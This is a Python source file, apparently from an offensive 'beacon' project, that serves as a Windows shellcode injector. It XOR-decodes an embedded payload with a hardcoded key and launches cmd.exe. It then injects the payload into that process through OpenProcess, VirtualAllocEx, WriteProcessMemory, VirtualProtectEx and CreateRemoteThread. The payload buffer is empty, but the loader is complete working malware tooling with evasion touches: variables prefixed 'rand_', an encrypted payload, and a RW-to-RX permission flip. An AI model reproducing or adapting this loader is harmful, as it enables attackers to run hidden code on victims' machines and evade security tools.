###############################################################################
# beacon.py - Part of the python beacon project
# This code is based on: https://github.com/RiverGumSecurity/PythonShellcode
# Modified by JCSteiner
###############################################################################

#%%## LOAD DEPENDENCEIS
from ctypes import wintypes, windll, c_size_t, pointer, c_int, byref
import subprocess
import numpy as np

###############################################################################
# ENCRYPTED SHELLCODE AND KEY HERE
###############################################################################
rand_buf = b''
rand_key = 'supersecret'

###############################################################################
# WHAT TO INJECT INTO
###############################################################################
rand_inject = "C:\\Windows\\System32\\cmd.exe"

# function to xor your encoded shellcode with the key provided
def rand_xor(rand_data, rand_k):
# data - the shellcode that gets passed in
# k    - the key used to xor the shellcode

# calculates the number of times the key will have to repeat
    rand_num_repeats = int(len(rand_data) / len(rand_k))
# calculates the rest of the key since it may not repeat an even number of times
    rand_remainder = len(rand_data) % len(rand_k)
# extends the key to the proper length
    newkey = rand_k * rand_num_repeats + rand_k[:rand_remainder]
    
# uses numpy to do a bitwise xor of the data with the key
    rand_rand_result = np.bitwise_xor(bytearray(rand_data), bytearray(newkey))

# returns the rand_result
    return bytes(rand_rand_result)

# decodes the shellcode
rand_buf = rand_xor(rand_buf, rand_key.encode())

# calculates the shellcode length for memory allocation later
rand_buf_len = len(rand_buf)

# constant values scraped from MSDN
rand_PROCESS_SOME_ACCESS = 0x000028
rand_MEM_COMMIT_RESERVE = 0x3000
rand_PAGE_READWRITE = 0x04
rand_PAGE_READ_EXECUTE = 0x20

# CloseHandle()
# https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
# Closes an open object handle
# paramter is a valid object handle
# returns bool on if the function was successful
rand_CloseHandle = windll.kernel32.CloseHandle
rand_CloseHandle.argtypes = [wintypes.HANDLE]
rand_CloseHandle.restype = wintypes.BOOL

# CreateRemoteThread()
# https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
# Creates a thread that runs in the virutal address space of another process
# parameters are:
#   hProcess - a handle to the process in which the thread is to be created
#   lpThreadAttributes - a pointer to security attributes, if Null, the thread gets default security attributes
#   dwStackSize - the initial size of the stack in bytes. If 0, use the default size for the executable
#   lpStartAddress - a pointer to the application function to start a thread
#   lpParameter - pointer to a variable to be passed to the thread function
#   dwCreationFlags - flags that control the creation of the the thread
# returns handle to the new thread
rand_CreateRemoteThread = windll.kernel32.CreateRemoteThread
rand_CreateRemoteThread.argtypes = [
    wintypes.HANDLE, wintypes.LPVOID, c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID]
rand_CreateRemoteThread.restype = wintypes.HANDLE

# OpenProcess()
# https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
# opens an existing local process object
# Parameters:
#   dwDesiredAccess - desired privilege access to the object
#   bInheritHandle - if True, we inherit permissions
#   dwProcessId - PID we want to open
# Returns handle to process opened
rand_OpenProcess = windll.kernel32.OpenProcess
rand_OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
rand_OpenProcess.restype = wintypes.HANDLE

# VirtualAllocEx()
# https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
# reserves, commits, or changes the state of a region of memory within the virtual address space
# of a specified process. the function intializes its memory to 0
# Parameters:
#   hProcess - handle to the process
#   lpAddress - pointer to the desired starting address for our allocation
#   dwSize - size of the region of memory to allocate in bytes
#   flAllocationType - type of memory allocation
#   flProtect - memory permissions
# Returns base address of the allocated region of the pages if successful
rand_VirtualAllocEx = windll.kernel32.VirtualAllocEx
rand_VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, c_size_t, wintypes.DWORD, wintypes.DWORD]
rand_VirtualAllocEx.restype = wintypes.LPVOID

# VirtualProtectEx()
# https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex
# changes the protection on a region of memory pages
# Parameters:
#   hProcess - the process whose protection will be changed
#   lpAddress - a pointer to the base address of the region of pages whose access will be changed
#   dwDize - the size of the region whose protection to change in bytes
#   flNewProtect - new memory protection option
#   lpflOldProtect - pointer to varaible to receive the old protections, this is required
# returns a nonzero value if successful
rand_VirtualProtectEx = windll.kernel32.VirtualProtectEx
rand_VirtualProtectEx.argtypes = [
    wintypes.HANDLE, wintypes.LPVOID, c_size_t, wintypes.DWORD, wintypes.LPVOID]
rand_VirtualProtectEx.restype = wintypes.BOOL

# WriteProcessMemory()
# https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
# writes data to an area of memory in a specified process
# Parameters:
#   hProcess - handle to the process memory being modified
#   lpBaseAddress - pointer to the base address in the process being written
#   lpBuffer - the data we want to write to this memory space
#   nSize - the number of bytes to be written to the specified process
#   lpNumberOfBytesWritten - pointer to variable to receive number of bytes transferred
# returns nonzero value if successful
rand_WriteProcessMemory = windll.kernel32.WriteProcessMemory
rand_WriteProcessMemory.argtypes = [
    wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, c_size_t, wintypes.LPVOID]
rand_WriteProcessMemory.restype = wintypes.BOOL

# Starts running the desired process and grabs the pid
rand_pid = subprocess.Popen(rand_inject, shell = False).pid

# runs the OpenProcess function to get the process handle for the subprocess we started
rand_ph = rand_OpenProcess(rand_PROCESS_SOME_ACCESS, False, rand_pid)
# if the process handle is 0, exit gracefully
if rand_ph == 0:
# Used for debugging: print("[-] ERROR: OpenProcess(): {}".format(windll.kernel32.GetLastError()))
    exit()

# Allocates memory for the buffer and gets back a pointer to it
# allocates with readwrite permissions in the 
rand_memptr = rand_VirtualAllocEx(rand_ph, 0, rand_buf_len,
    rand_MEM_COMMIT_RESERVE, rand_PAGE_READWRITE)

# if the memory failed to be allocated, exit gracefully
if rand_memptr == 0:
# Used for debugging: print("[-] ERROR: VirtualAllocEx(): {}".format(windll.kernel32.GetLastError()))
    exit()

# writes the shellcode into the memory of the process we spawned
rand_nbytes = c_int(0)
rand_result = rand_WriteProcessMemory(rand_ph, rand_memptr, rand_buf,
    rand_buf_len, byref(rand_nbytes)
)

#if we couldn't write to the process, exit gracefully
if rand_result == 0:
# Used for debugging: print("[-] ERROR: WriteProcessMemory(): {}".format(windll.kernel32.GetLastError()))
    exit()

# changes permissions on the memory we wrote from RW to RX
rand_old_protection = pointer(wintypes.DWORD())
rand_result2 = rand_VirtualProtectEx(rand_ph, rand_memptr, rand_buf_len,
    rand_PAGE_READ_EXECUTE, rand_old_protection
)

# if we couldn't change permissions to be executable, exit gracefully
if rand_result2 == 0:
# Used for debugging: print("[-] ERROR: VirtualProtextEx(): {}".format(windll.kernel32.GetLastError()))
    exit()

# creates a thread to start executing the memory our shellcode is in
rand_thread = rand_CreateRemoteThread(rand_ph, None, 0, rand_memptr, None, 0, None)

# if we couldn't start a thread, exit gracefully
if rand_thread == 0:
# Used for debugging: print("[-] ERROR: CreateRemoteThread(): {}".format(windll.kernel32.GetLastError()))
    exit()

# closes our handle to the process
rand_CloseHandle(rand_ph)
